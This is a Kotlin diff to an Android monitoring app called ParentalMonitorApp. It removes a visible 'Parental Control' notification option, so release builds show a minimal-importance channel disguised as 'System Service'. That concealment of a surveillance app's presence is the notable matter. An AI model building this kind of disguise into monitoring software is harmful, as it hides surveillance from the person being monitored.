@@ -19,20 +19,16 @@ class ParentalMonitorApp : Application() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val parental = BuildConfig.PARENTAL_UI
-            val importance = if (BuildConfig.DEBUG || parental) {
+            val importance = if (BuildConfig.DEBUG) {
                 NotificationManager.IMPORTANCE_LOW
             } else {
-                NotificationManager.IMPORTANCE_MIN // Minimal - almost invisible
+                NotificationManager.IMPORTANCE_MIN
             }
 
-            // Channel name CANNOT be empty - Android requirement
-            val channelName = if (parental) {
-                "Parental Control"
-            } else if (BuildConfig.DEBUG) {
+            val channelName = if (BuildConfig.DEBUG) {
                 CHANNEL_NAME
             } else {
-                "System Service" // Minimal generic name for release
+                "System Service"
             }
             
             val channel = NotificationChannel(
